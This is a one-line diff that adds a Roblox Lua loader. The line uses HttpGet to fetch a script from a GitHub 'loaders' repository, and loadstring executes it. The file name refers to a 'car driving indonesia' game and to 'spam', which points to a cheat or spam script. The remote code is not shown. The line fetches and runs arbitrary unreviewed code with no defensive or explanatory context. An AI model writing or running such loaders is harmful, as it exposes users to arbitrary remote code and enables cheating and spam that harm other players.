@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/car-driving-indonesia-spam1-olqcws85ihr2vx.lua"))()
